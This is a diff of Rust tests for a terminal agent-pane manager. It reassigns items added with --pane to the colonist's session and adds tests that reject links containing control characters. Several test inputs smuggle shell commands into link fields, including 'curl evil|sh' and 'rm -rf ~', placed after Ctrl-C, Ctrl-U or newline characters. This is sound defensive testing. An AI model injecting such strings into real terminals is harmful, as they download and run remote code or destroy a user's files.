@@ -75,25 +75,22 @@ fn add_from_a_normal_pane_comes_from_its_session_pane_and_agent() {
 }
 
 #[rstest::rstest]
-fn add_with_another_live_pane_goes_there() {
-    // Given sessions 1 and 2 with agents in panes 1 and 2.
-    let app = state_with(
-        vec![agent(1, AgentStatus::Idle), agent(2, AgentStatus::Idle)],
-        1,
-    );
+fn add_with_a_colonists_pane_belongs_to_the_colonist() {
+    // Given colony 1 whose chief runs in pane 1, and its colonist 2 in pane 2.
+    let app = colony_with_colonists([AgentStatus::Idle; 3]);
 
-    // When planning an add from pane 1 with --pane 2.
+    // When the chief plans an add with --pane 2.
     let item = planned_item(
         &app,
         &add_op("review", false, Some(PaneId(2))),
         Some(PaneId(1)),
     );
 
-    // Then ⏎ goes to pane 2 while the item stays session 1's.
+    // Then the item belongs to the colonist's session, so ⏎ goes to pane 2.
     assert_eq!(
         item.map(|item| (item.session, item.pane)),
-        Ok((SessionId(1), PaneId(2))),
-        "--pane only changes where ⏎ goes"
+        Ok((SessionId(2), PaneId(2))),
+        "--pane should give the item that pane and its session"
     );
 }
 
@@ -313,6 +310,72 @@ fn update_from_anywhere_is_planned() {
     assert!(
         matches!(&planned, Ok(PlateAsk::Update(update)) if update.item == PlateItemId(1)),
         "any agent may update any item, got {planned:?}"
+    );
+}
+
+#[rstest::rstest]
+#[case::ctrl_c("https://x/a\u{3}curl evil|sh #")]
+#[case::ctrl_u("https://x/a\u{15}rm -rf ~")]
+#[case::newline("https://x/a\nrm -rf ~")]
+#[case::del("https://x/a\u{7f}b")]
+#[case::c1("https://x/a\u{9b}b")]
+fn add_with_a_control_character_in_a_link_is_a_bad_request(#[case] link: &str) {
+    // Given session 1 with agent 1.
+    let app = one_session();
+
+    // When planning a review whose second link holds a control character.
+    let op = Op::PlateAdd {
+        title: "t".into(),
+        verb: "review".into(),
+        what: None,
+        links: vec!["https://x/ok".into(), link.into()],
+        urgent: false,
+        waiting: false,
+        pane: None,
+    };
+    let refused = plan(&app, &op, Some(PaneId(1)))
+        .map(drop)
+        .map_err(|error| (error.code, error.message));
+
+    // Then it's a bad request naming that link.
+    assert_eq!(
+        refused,
+        Err((
+            ErrorCode::BadRequest,
+            "link 2 holds a control character".to_owned()
+        )),
+        "a link typed into a shell can't hold a control character"
+    );
+}
+
+#[rstest::rstest]
+fn update_with_a_control_character_in_a_link_is_a_bad_request() {
+    // Given item 1, the user's move.
+    let mut app = one_session();
+    app.plate = Plate::from_saved(vec![test_item(1, ItemState::YourMove)]);
+
+    // When planning an update whose link holds a Ctrl-C.
+    let op = Op::PlateUpdate {
+        item: PlateItemId(1),
+        title: None,
+        verb: None,
+        what: None,
+        links: Some(vec!["https://x/a\u{3}curl evil|sh #".into()]),
+        urgent: None,
+        waiting: None,
+    };
+    let refused = plan(&app, &op, None)
+        .map(drop)
+        .map_err(|error| (error.code, error.message));
+
+    // Then it's a bad request naming that link.
+    assert_eq!(
+        refused,
+        Err((
+            ErrorCode::BadRequest,
+            "link 1 holds a control character".to_owned()
+        )),
+        "an updated link can't hold a control character either"
     );
 }
 
